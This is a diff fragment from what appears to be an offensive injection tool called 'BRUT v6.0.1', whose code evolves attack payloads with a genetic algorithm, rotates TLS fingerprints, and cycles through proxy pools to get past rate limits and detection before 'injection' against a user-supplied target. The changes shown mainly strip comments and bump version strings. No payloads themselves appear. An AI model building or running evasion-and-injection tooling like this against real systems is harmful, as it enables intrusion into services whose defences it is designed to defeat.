                         found_success = True
                         if max_mode: break
 
-                # Periodic summaries
                 if tested % 50 == 0 and tested > 0:
                     ml = self.learner.get_learning_summary()
                     if ml != "Learning...":
@@ -3730,7 +3690,6 @@ class BRUTPipeline:
                     new_pop = self.evolver.evolve_generation()
                     print(f"\n  \033[1;35m[EVOLUTION]\033[0m Generation {self.evolver.generation}: "
                           f"{len(new_pop)} evolved payloads ready")
-                    # Rotate TLS fingerprint every 100 requests
                     self.tls_engine._rotate_target()
                     print(f"  \033[1;35m[TLS]\033[0m Fingerprint rotated to: "
                           f"{self.tls_engine.get_current_fingerprint()}\n")
@@ -3783,7 +3742,7 @@ class BRUTPipeline:
         rate_limited = [r for r in self.results if r.status_code == 429]
 
         print(f"\n\033[1;36m{'='*80}")
-        print(f"  BRUT v6.0 — ANTI-RATE-LIMIT GENETIC ML SUMMARY")
+        print(f"  BRUT v6.0.1 — ANTI-RATE-LIMIT GENETIC ML SUMMARY")
         print(f"{'='*80}\033[0m")
         print(f"  Total tested         : {len(self.results)}")
         print(f"  \033[32m✓ Server output\033[0m      : {len(server)}")
@@ -3795,7 +3754,6 @@ class BRUTPipeline:
         print(f"  \033[1;35mGenetic:\033[0m {self.evolver.get_generation_summary()}")
         print(f"  \033[1;35mEncoding:\033[0m {self.encoder.get_rotation_summary()}")
 
-        # v6.0: Anti-rate-limit summary
         print(f"\n  \033[1;35m{'─'*40} ANTI-RATE-LIMIT {'─'*40}\033[0m")
         self.proxy_manager.print_pool_status()
         self.throttler.print_stats()
@@ -3824,7 +3782,7 @@ class BRUTPipeline:
 
 
 # ============================================================
-# INTERACTIVE MAIN LOOP v6.0
+# INTERACTIVE MAIN LOOP v6.0.1
 # ============================================================
 def interactive_main():
     print_banner()
@@ -3847,7 +3805,6 @@ def interactive_main():
         if target.lower() in ["/exit", "exit", "/quit", "quit"]:
             print(f"\n\033[31m[*]\033[0m Goodbye!"); break
 
-        # v6.0: Proxy file loading command
         if target.lower().startswith("/proxy "):
             proxy_file = target[7:].strip()
             print(f"  \033[35m[*]\033[0m Proxy file set: {proxy_file}")
@@ -3891,7 +3848,6 @@ def interactive_main():
                 print(f"    ... dan {len(plist)-8} lainnya")
             print()
 
-        # v6.0: Show anti-rate-limit status before injection
         print(f"  \033[1;35mAnti-Rate-Limit Status:\033[0m")
         pipeline.proxy_manager.print_pool_status()
         print(f"  \033[1;36m[TLS]\033[0m Fingerprint: {pipeline.tls_engine.get_current_fingerprint()}")
